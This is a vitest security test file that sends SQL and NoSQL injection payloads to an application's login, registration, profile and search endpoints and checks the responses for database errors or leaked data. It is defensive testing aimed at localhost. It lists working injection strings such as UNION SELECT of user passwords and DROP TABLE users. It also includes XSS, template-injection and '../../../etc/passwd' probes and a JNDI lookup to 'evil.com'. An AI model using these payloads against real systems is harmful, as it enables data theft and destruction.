/**
 * SQL Injection Prevention Tests
 *
 * Comprehensive testing for SQL injection vulnerabilities across all application
 * endpoints that accept user input. These tests validate that proper input
 * validation, parameterized queries, and SQL injection prevention measures are in place.
 *
 * Test Categories:
 * - Classic SQL injection patterns
 * - Union-based SQL injection
 * - Blind SQL injection
 * - Time-based SQL injection
 * - Second-order SQL injection
 * - NoSQL injection (for document databases)
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import axios, { AxiosError } from 'axios';

interface SQLInjectionTestCase {
  name: string;
  payload: string | object;
  description: string;
  expectedBehavior: 'blocked' | 'sanitized' | 'error';
  severity: 'critical' | 'high' | 'medium' | 'low';
}

interface InjectionTestResult {
  testCase: SQLInjectionTestCase;
  endpoint: string;
  method: string;
  statusCode: number;
  responseBody: any;
  vulnerabilityDetected: boolean;
  evidence?: string;
}

describe('SQL Injection Prevention Tests', () => {
  let baseUrl: string;
  let testResults: InjectionTestResult[] = [];

  beforeEach(() => {
    baseUrl = process.env.TEST_BASE_URL || 'http://localhost:3000';
    testResults = [];
  });

  /**
   * Execute SQL injection test case
   */
  async function executeSQLInjectionTest(
    testCase: SQLInjectionTestCase,
    endpoint: string,
    method: 'GET' | 'POST' | 'PUT' | 'PATCH' = 'POST',
    additionalData?: any
  ): Promise<InjectionTestResult> {
    const payload = typeof testCase.payload === 'string' ? testCase.payload : JSON.stringify(testCase.payload);
    let response;
    let statusCode: number;
    let responseBody: any;
    let vulnerabilityDetected = false;
    let evidence: string | undefined;

    try {
      const config = {
        validateStatus: () => true, // Don't throw on any status code
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'SQL-Injection-Tester/1.0'
        }
      };

      switch (method) {
        case 'GET':
          response = await axios.get(`${baseUrl}${endpoint}?q=${encodeURIComponent(payload)}`, config);
          break;
        case 'POST':
          response = await axios.post(`${baseUrl}${endpoint}`, {
            ...additionalData,
            ...testCase.payload
          }, config);
          break;
        case 'PUT':
          response = await axios.put(`${baseUrl}${endpoint}`, {
            ...additionalData,
            ...testCase.payload
          }, config);
          break;
        case 'PATCH':
          response = await axios.patch(`${baseUrl}${endpoint}`, {
            ...additionalData,
            ...testCase.payload
          }, config);
          break;
        default:
          throw new Error(`Unsupported method: ${method}`);
      }

      statusCode = response.status;
      responseBody = response.data;

      // Analyze response for SQL injection indicators
      vulnerabilityDetected = analyzeResponseForSQLInjection(payload, responseBody, statusCode);
      if (vulnerabilityDetected) {
        evidence = extractEvidence(responseBody);
      }

    } catch (error: any) {
      statusCode = error.response?.status || 500;
      responseBody = error.response?.data || { error: error.message };
    }

    const result: InjectionTestResult = {
      testCase,
      endpoint,
      method,
      statusCode,
      responseBody,
      vulnerabilityDetected,
      evidence
    };

    testResults.push(result);
    return result;
  }

  /**
   * Analyze response for SQL injection indicators
   */
  function analyzeResponseForSQLInjection(payload: string, responseBody: any, statusCode: number): boolean {
    const responseText = JSON.stringify(responseBody).toLowerCase();

    // SQL error patterns that indicate successful injection
    const sqlErrorPatterns = [
      'sql syntax',
      'mysql_fetch',
      'ora-',
      'postgresql',
      'sqlite_',
      'microsoft ole db',
      'odbc drivers error',
      'warning: mysql',
      'valid mysql result',
      'mysqlclient',
      'column count',
      'operand should contain',
      'mysql_num_rows',
      'expects parameter',
      'syntax error',
      'unclosed quotation mark',
      'incorrect syntax near',
      'invalid object name',
      'ambiguous column name'
    ];

    // Success indicators for injection
    const injectionSuccessPatterns = [
      'you have an error in your sql syntax',
      'supplied argument is not a valid mysql',
      'function.mysql',
      'mysql_fetch_array()',
      'mysql_fetch_assoc()',
      'mysql_num_rows()',
      'column count doesn\'t match value count',
      'duplicate entry',
      'data too long for column'
    ];

    // Check for SQL errors in response
    const hasSQLError = sqlErrorPatterns.some(pattern => responseText.includes(pattern));
    const hasInjectionEvidence = injectionSuccessPatterns.some(pattern => responseText.includes(pattern));

    // Check for unexpected data leakage (e.g., all users returned)
    const dataLeakagePatterns = [
      /password.*hash/i,
      /secret/i,
      /token.*secret/i,
      /\[.*\{.*id.*:.*email.*:.*\}.*\]/ // JSON pattern suggesting user data
    ];

    const hasDataLeakage = dataLeakagePatterns.some(pattern => responseText.match(pattern));

    return hasSQLError || hasInjectionEvidence || hasDataLeakage;
  }

  /**
   * Extract evidence of vulnerability
   */
  function extractEvidence(responseBody: any): string {
    const responseText = JSON.stringify(responseBody);

    // Find the first SQL-related error message
    const sqlErrorMatch = responseText.match(/(sql syntax|mysql|postgresql|ora-)[^"]*/i);
    if (sqlErrorMatch) {
      return sqlErrorMatch[0];
    }

    // Find password-related data leakage
    const passwordMatch = responseText.match(/password[^"}]*[:\s][^"}\s]*/i);
    if (passwordMatch) {
      return passwordMatch[0];
    }

    return 'Potential SQL injection detected in response';
  }

  /**
   * Classic SQL injection test cases
   */
  const classicSQLInjectionTests: SQLInjectionTestCase[] = [
    {
      name: 'Single Quote Injection',
      payload: "' OR '1'='1",
      description: 'Classic single quote SQL injection',
      expectedBehavior: 'blocked',
      severity: 'critical'
    },
    {
      name: 'Double Quote Injection',
      payload: '" OR "1"="1',
      description: 'Double quote SQL injection',
      expectedBehavior: 'blocked',
      severity: 'critical'
    },
    {
      name: 'Comment-Based Injection',
      payload: "' OR 1=1 --",
      description: 'SQL injection with comment',
      expectedBehavior: 'blocked',
      severity: 'critical'
    },
    {
      name: 'Union Select Injection',
      payload: "' UNION SELECT username, password FROM users --",
      description: 'UNION-based SQL injection',
      expectedBehavior: 'blocked',
      severity: 'critical'
    },
    {
      name: 'Boolean-Based Injection',
      payload: "' AND 1=1 --",
      description: 'Boolean-based blind SQL injection',
      expectedBehavior: 'blocked',
      severity: 'high'
    },
    {
      name: 'Time-Based Injection',
      payload: "'; WAITFOR DELAY '00:00:05' --",
      description: 'Time-based SQL injection',
      expectedBehavior: 'blocked',
      severity: 'critical'
    },
    {
      name: 'Stacked Query Injection',
      payload: "'; DROP TABLE users; --",
      description: 'Stacked query SQL injection',
      expectedBehavior: 'blocked',
      severity: 'critical'
    },
    {
      name: 'Error-Based Injection',
      payload: "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
      description: 'Error-based SQL injection',
      expectedBehavior: 'blocked',
      severity: 'critical'
    }
  ];

  /**
   * NoSQL injection test cases
   */
  const noSQLInjectionTests: SQLInjectionTestCase[] = [
    {
      name: 'NoSQL Comment Injection',
      payload: { "$comment": "1' OR 1=1 --" },
      description: 'NoSQL comment injection',
      expectedBehavior: 'blocked',
      severity: 'high'
    },
    {
      name: 'NoSQL Regex Injection',
      payload: { "$regex": ".*" },
      description: 'NoSQL regex injection',
      expectedBehavior: 'blocked',
      severity: 'high'
    },
    {
      name: 'NoSQL Where Injection',
      payload: { "$where": "function() { return true; }" },
      description: 'NoSQL $where injection',
      expectedBehavior: 'blocked',
      severity: 'critical'
    },
    {
      name: 'NoSQL Ne Injection',
      payload: { "$ne": "" },
      description: 'NoSQL $ne injection',
      expectedBehavior: 'blocked',
      severity: 'high'
    },
    {
      name: 'NoSQL GT Injection',
      payload: { "$gt": "" },
      description: 'NoSQL $gt injection',
      expectedBehavior: 'blocked',
      severity: 'high'
    }
  ];

  /**
   * Advanced injection techniques
   */
  const advancedInjectionTests: SQLInjectionTestCase[] = [
    {
      name: 'Base64 Encoded Injection',
      payload: Buffer.from("' OR '1'='1").toString('base64'),
      description: 'Base64 encoded SQL injection',
      expectedBehavior: 'blocked',
      severity: 'high'
    },
    {
      name: 'URL Encoded Injection',
      payload: "%27%20OR%20%271%27%3D%271",
      description: 'URL encoded SQL injection',
      expectedBehavior: 'blocked',
      severity: 'critical'
    },
    {
      name: 'Unicode Injection',
      payload: "\u0027 OR \u00271\u0027=\u00271",
      description: 'Unicode character SQL injection',
      expectedBehavior: 'blocked',
      severity: 'high'
    },
    {
      name: 'Second-Order Injection',
      payload: "Robert'); DROP TABLE users; --",
      description: 'Second-order SQL injection',
      expectedBehavior: 'blocked',
      severity: 'critical'
    }
  ];

  describe('Authentication Endpoint SQL Injection Tests', () => {
    it('should prevent SQL injection in login endpoint', async () => {
      const endpoint = '/api/auth/login';

      for (const testCase of classicSQLInjectionTests) {
        const result = await executeSQLInjectionTest(testCase, endpoint, 'POST', {
          email: testCase.payload,
          password: 'password123'
        });

        expect(result.vulnerabilityDetected).toBe(false);

        if (result.vulnerabilityDetected) {
          console.error(`🚨 SQL Injection vulnerability detected in ${testCase.name}`);
          console.error(`   Payload: ${testCase.payload}`);
          console.error(`   Evidence: ${result.evidence}`);
        }
      }

      console.log(`✅ Login endpoint SQL injection tests completed: ${testResults.length} tests`);
    });

    it('should prevent SQL injection in registration endpoint', async () => {
      const endpoint = '/api/auth/register';

      for (const testCase of classicSQLInjectionTests) {
        const result = await executeSQLInjectionTest(testCase, endpoint, 'POST', {
          email: `test-${Date.now()}@example.com`,
          password: testCase.payload,
          confirmPassword: testCase.payload,
          firstName: 'Test',
          lastName: 'User'
        });

        expect(result.vulnerabilityDetected).toBe(false);
      }

      console.log(`✅ Registration endpoint SQL injection tests completed`);
    });

    it('should prevent NoSQL injection in authentication', async () => {
      const endpoint = '/api/auth/login';

      for (const testCase of noSQLInjectionTests) {
        const result = await executeSQLInjectionTest(testCase, endpoint, 'POST', {
          email: 'test@example.com',
          password: 'password123',
          ...testCase.payload
        });

        expect(result.vulnerabilityDetected).toBe(false);
      }

      console.log(`✅ Authentication NoSQL injection tests completed`);
    });
  });

  describe('User Management SQL Injection Tests', () => {
    it('should prevent SQL injection in user profile operations', async () => {
      const endpoint = '/api/users/profile';

      for (const testCase of classicSQLInjectionTests) {
        // Test GET operations
        await executeSQLInjectionTest(testCase, endpoint, 'GET');

        // Test PATCH operations
        await executeSQLInjectionTest(testCase, endpoint, 'PATCH', {
          firstName: testCase.payload,
          lastName: 'TestUser'
        });
      }

      const profileVulnerabilities = testResults.filter(r => r.vulnerabilityDetected);
      expect(profileVulnerabilities.length).toBe(0);

      console.log(`✅ User profile SQL injection tests completed`);
    });

    it('should prevent SQL injection in user search', async () => {
      const endpoint = '/api/users/search';

      for (const testCase of classicSQLInjectionTests) {
        const result = await executeSQLInjectionTest(testCase, endpoint, 'POST', {
          query: testCase.payload
        });

        expect(result.vulnerabilityDetected).toBe(false);
      }

      console.log(`✅ User search SQL injection tests completed`);
    });
  });

  describe('Search and Filtering SQL Injection Tests', () => {
    it('should prevent SQL injection in general search', async () => {
      const endpoint = '/api/search';

      for (const testCase of classicSQLInjectionTests) {
        const result = await executeSQLInjectionTest(testCase, endpoint, 'GET');

        expect(result.vulnerabilityDetected).toBe(false);
      }

      console.log(`✅ General search SQL injection tests completed`);
    });

    it('should prevent SQL injection in student search', async () => {
      const endpoint = '/api/students/search';

      for (const testCase of classicSQLInjectionTests) {
        const result = await executeSQLInjectionTest(testCase, endpoint, 'POST', {
          name: testCase.payload,
          grade: '1'
        });

        expect(result.vulnerabilityDetected).toBe(false);
      }

      console.log(`✅ Student search SQL injection tests completed`);
    });
  });

  describe('Advanced SQL Injection Techniques', () => {
    it('should prevent advanced injection techniques', async () => {
      const endpoints = ['/api/auth/login', '/api/search', '/api/users/profile'];

      for (const testCase of advancedInjectionTests) {
        for (const endpoint of endpoints) {
          await executeSQLInjectionTest(testCase, endpoint, 'GET');
        }
      }

      const advancedVulnerabilities = testResults.filter(r =>
        r.vulnerabilityDetected &&
        advancedInjectionTests.some(test => test.name === r.testCase.name)
      );

      expect(advancedVulnerabilities.length).toBe(0);

      console.log(`✅ Advanced SQL injection techniques tests completed`);
    });
  });

  describe('Input Validation and Sanitization Tests', () => {
    it('should properly validate and sanitize input parameters', async () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
        '<%=7*7%>',
        '${7*7}',
        '#{{7*7}}',
        '{{7*7}}',
        '#{7*7}'
      ];

      const endpoint = '/api/search';

      for (const input of maliciousInputs) {
        const testCase: SQLInjectionTestCase = {
          name: `Input Validation: ${input}`,
          payload: input,
          description: `Input validation test for: ${input}`,
          expectedBehavior: 'sanitized',
          severity: 'medium'
        };

        const result = await executeSQLInjectionTest(testCase, endpoint, 'GET');

        // Should not execute the malicious input
        expect(result.vulnerabilityDetected).toBe(false);

        // Response should not contain the raw malicious input (should be sanitized)
        if (result.statusCode === 200) {
          const responseText = JSON.stringify(result.responseBody);
          const containsMaliciousInput = responseText.includes(input);
          expect(containsMaliciousInput).toBe(false);
        }
      }

      console.log(`✅ Input validation and sanitization tests completed`);
    });
  });

  describe('Error Handling Tests', () => {
    it('should not expose database errors to users', async () => {
      const errorInducingPayloads = [
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        "'; SELECT pg_sleep(5) --",
        "'; SELECT SLEEP(5) --",
        "' OR 1=CONVERT(int, (SELECT @@version)) --"
      ];

      const endpoint = '/api/auth/login';

      for (const payload of errorInducingPayloads) {
        const testCase: SQLInjectionTestCase = {
          name: 'Database Error Exposure',
          payload,
          description: 'Test for database error information disclosure',
          expectedBehavior: 'error',
          severity: 'medium'
        };

        const result = await executeSQLInjectionTest(testCase, endpoint, 'POST', {
          email: payload,
          password: 'password123'
        });

        // Should not contain database-specific error information
        if (result.statusCode >= 400) {
          const responseText = JSON.stringify(result.responseBody).toLowerCase();
          const containsDBInfo = [
            'mysql', 'postgresql', 'sqlite', 'oracle', 'microsoft sql server',
            'version()', '@@version', 'database error', 'sql syntax'
          ].some(term => responseText.includes(term));

          expect(containsDBInfo).toBe(false);
        }
      }

      console.log(`✅ Error handling tests completed`);
    });
  });

  describe('Comprehensive SQL Injection Report', () => {
    it('should generate comprehensive SQL injection security report', () => {
      console.log('\n🛡️  COMPREHENSIVE SQL INJECTION SECURITY REPORT');
      console.log('===============================================');

      const totalTests = testResults.length;
      const vulnerabilitiesFound = testResults.filter(r => r.vulnerabilityDetected).length;
      const criticalVulnerabilities = testResults.filter(r =>
        r.vulnerabilityDetected && r.testCase.severity === 'critical'
      ).length;
      const highVulnerabilities = testResults.filter(r =>
        r.vulnerabilityDetected && r.testCase.severity === 'high'
      ).length;

      console.log(`📊 TEST SUMMARY:`);
      console.log(`   Total SQL Injection Tests: ${totalTests}`);
      console.log(`   Vulnerabilities Found: ${vulnerabilitiesFound}`);
      console.log(`   Critical Vulnerabilities: ${criticalVulnerabilities} 🔴`);
      console.log(`   High Vulnerabilities: ${highVulnerabilities} 🟠`);

      console.log(`\n📋 VULNERABILITY BREAKDOWN:`);
      const vulnerabilitiesByCategory = testResults
        .filter(r => r.vulnerabilityDetected)
        .reduce((acc, result) => {
          const category = result.testCase.name.split(' ')[0];
          acc[category] = (acc[category] || 0) + 1;
          return acc;
        }, {} as Record<string, number>);

      Object.entries(vulnerabilitiesByCategory).forEach(([category, count]) => {
        console.log(`   ${category}: ${count} vulnerabilities`);
      });

      if (vulnerabilitiesFound > 0) {
        console.log(`\n🚨 DETAILED VULNERABILITY REPORT:`);
        testResults
          .filter(r => r.vulnerabilityDetected)
          .forEach(result => {
            const severityIcon = result.testCase.severity === 'critical' ? '🔴' :
                               result.testCase.severity === 'high' ? '🟠' :
                               result.testCase.severity === 'medium' ? '🟡' : '🟢';

            console.log(`\n   ${severityIcon} ${result.testCase.name} (${result.testCase.severity.toUpperCase()})`);
            console.log(`      Endpoint: ${result.method} ${result.endpoint}`);
            console.log(`      Payload: ${JSON.stringify(result.testCase.payload)}`);
            console.log(`      Status Code: ${result.statusCode}`);
            if (result.evidence) {
              console.log(`      Evidence: ${result.evidence}`);
            }
            console.log(`      Description: ${result.testCase.description}`);
          });
      }

      console.log(`\n🎯 SECURITY ASSESSMENT:`);
      if (vulnerabilitiesFound === 0) {
        console.log(`   ✅ EXCELLENT: No SQL injection vulnerabilities detected`);
        console.log(`   ✅ All input validation mechanisms are working correctly`);
        console.log(`   ✅ Proper parameterized queries appear to be in use`);
      } else if (criticalVulnerabilities === 0) {
        console.log(`   ⚠️  WARNING: ${vulnerabilitiesFound} SQL injection vulnerabilities found`);
        console.log(`   ⚠️  No critical vulnerabilities, but security improvements needed`);
      } else {
        console.log(`   🚨 CRITICAL: ${criticalVulnerabilities} critical SQL injection vulnerabilities found`);
        console.log(`   🚨 Immediate remediation required`);
      }

      console.log(`\n📈 RECOMMENDATIONS:`);
      if (vulnerabilitiesFound > 0) {
        console.log(`   🔴 URGENT: Fix ${criticalVulnerabilities} critical SQL injection vulnerabilities`);
        console.log(`   🟠 HIGH: Address ${highVulnerabilities} high severity SQL injection issues`);
        console.log(`   💡 Implement comprehensive input validation on all endpoints`);
        console.log(`   💡 Use parameterized queries for all database operations`);
        console.log(`   💡 Implement Web Application Firewall (WAF) rules`);
        console.log(`   💡 Conduct regular security testing and code reviews`);
      } else {
        console.log(`   ✅ Continue following secure coding practices`);
        console.log(`   ✅ Maintain regular security testing schedule`);
        console.log(`   ✅ Stay updated on latest SQL injection techniques`);
        console.log(`   ✅ Consider implementing additional security layers`);
      }

      // Overall security assertion
      expect(criticalVulnerabilities).toBe(0);
      expect(highVulnerabilities).toBe(0);
      expect(vulnerabilitiesFound).toBe(0);
    });
  });
});